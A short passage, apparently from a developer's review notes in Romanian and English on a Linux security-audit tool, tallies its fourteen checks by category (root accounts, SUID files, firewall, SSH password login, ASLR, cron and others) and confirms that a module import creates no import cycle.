uid0, pkg, suid = 5 critical; fw, ssh-passauth = 2 network; sudo, world-writable, ipfwd,
aslr, autoupdate = 5 hygiene; cron, svc = 2 activity → 14). ✓
**Import cycle:** `linux_audit.py` importeaza `ScanProfile` din `agent.core`; `core`
importeaza `collectors` tardiv (in collect_system_data) → fara ciclu la import. ✓
